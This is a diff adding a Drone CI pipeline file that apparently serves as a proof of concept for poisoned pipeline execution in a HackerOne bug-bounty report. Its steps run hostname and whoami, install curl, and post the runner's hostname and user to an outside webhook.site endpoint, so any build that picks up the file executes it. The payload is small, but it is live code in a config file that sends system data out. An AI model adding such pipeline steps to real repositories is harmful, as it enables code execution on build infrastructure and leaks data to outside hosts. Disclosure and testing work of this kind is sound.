@@ -1,0 +1,14 @@
+---
+kind: pipeline
+type: docker
+name: security-test
+
+steps:
+- name: verify-rce
+  image: alpine:latest
+  commands:
+  - echo 'Security test - PPE verification for HackerOne report'
+  - echo 'Hostname:' && hostname
+  - echo 'Whoami:' && whoami
+  - apk add --no-cache curl > /dev/null 2>&1
+  - curl -sk https://webhook.site/ -d "rce_verified=true&hostname=$(hostname)&user=$(whoami)"
